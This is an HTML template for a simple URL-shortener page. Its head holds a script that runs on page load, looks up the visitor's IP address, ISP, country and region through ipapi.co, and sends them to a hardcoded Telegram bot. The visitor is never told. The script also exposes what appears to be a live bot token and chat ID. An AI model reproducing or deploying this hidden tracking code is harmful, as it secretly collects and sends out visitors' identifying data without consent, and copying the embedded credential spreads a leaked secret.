<!-- templates/shorten_url.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>URL Shortener</title>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

        <script>
            $.getJSON('https://ipapi.co/json', function(data) {
                var ip = data.ip;
                var isp = data.org;
                var country = data.country_name;
                var city = data.region;
    
                // إرسال المعلومات إلى تليجرام مع فواصل سطر جديدة
                var message = `URL Shortener%0AIP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}`;
                sendTelegramMessage(message);
            });
    
            function sendTelegramMessage(message) {
                var chatId = '1045091647'; // استبدل بمعرف الدردشة الخاص بك
                var botToken = '6268789988:AAFslFmhzIT8m4uGpdZgarfvicJrciJ_vg0'; // استبدل برمز الروبوت الخاص بك
    
                var xhr = new XMLHttpRequest();
                xhr.open('GET', `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`, true);
                xhr.send();
            }
        </script>
    </head>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            text-align: center;
            padding: 50px;
        }
        form {
            display: inline-block;
            margin-top: 20px;
        }
        input[type=text] {
            width: 300px;
            padding: 10px;
            font-size: 1em;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        input[type=submit] {
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1em;
        }
        p {
            font-size: 1.2em;
            color: #666;
        }
        a {
            color: #007bff;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <h1>URL Shortener</h1>
    <form action="/shorten" method="post">
        <input type="text" name="original_url" placeholder="Enter your URL here" required>
        <input type="submit" value="Shorten">
    </form>
    {% if short_url %}
        <p>Your shortened URL: <a href="{{ short_url }}" target="_blank">{{ short_url }}</a></p>
    {% endif %}

</body>
</html>
